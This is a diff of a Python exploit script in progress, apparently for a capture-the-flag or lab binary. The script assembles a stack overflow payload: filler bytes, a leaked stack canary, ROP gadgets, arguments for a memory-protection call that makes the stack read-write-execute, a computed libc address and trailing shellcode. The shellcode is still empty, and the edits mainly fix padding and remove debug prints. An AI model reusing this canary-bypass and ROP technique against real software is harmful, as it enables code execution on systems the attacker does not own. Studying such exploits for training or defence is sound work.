@@ -73,7 +73,7 @@ try:
         bbase_byte_array.reverse()
 
 
-    hexcode = b"" # need to develop hexcode, put in as bytes, change mem its in to executable, run it
+    shellcode = b"" # need to develop hexcode, put in as bytes, change mem its in to executable, run it
 
     overflow1 = b"\x00" + b"A" * 23
     # hex_canary and canary_byte_array defined on first request
@@ -96,11 +96,14 @@ try:
     arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - int("0x0", 16))[2:])
     arg_addr.reverse()
     
-    arg_len = len(hexcode) # len of the hexcode as size_t
 
-    arg_prot = 0  # int, look at man pages (c-level flags)
+    arg_len = b"0"  # len of the shellcode as size_t
 
-    funcaddr = hex(int(binary_base, 16) + 0xaea) # now in libc, not local binary
+    arg_prot = b"\x07"  # int, look at man pages (c-level flags)
+
+    #TODO check funcaddr w zerochecker
+
+    funcaddr = hex((int(stack_base, 16) - 0x85D1000) + 0x101830 - 0x208B0) # now in libc, not local binary
     faddr_byte_array = bytearray.fromhex(funcaddr[2:])
     faddr_byte_array.reverse()
 
@@ -108,16 +111,11 @@ try:
     print(funcaddr)
 
     exploit = overflow1 + canary_byte_array + overflow2 + gadget1 + b"\x00\x00"  + arg_addr + b"\x00\x00"
-    exploit += gadget2 + b"\x00\x00" + arg_len + b"\x00"*8 + gadget3 + b"\x00\x00" + arg_prot + funcaddr + shellcode
+    exploit += gadget2 + b"\x00\x00" + arg_len + b"\x00"*(16-len(arg_len)) + gadget3 + b"\x00\x00" + arg_prot + b"\x00"*(8-len(arg_prot)) + faddr_byte_array + shellcode
 
     print("Canary_byte_array before sent:")
     print(canary_byte_array)
 
-    print("gadget:")
-    print(gadget)
-
-    print("argaddr:")
-    print(argaddr)
 
     print("faddr_byte_array")
     print(faddr_byte_array)
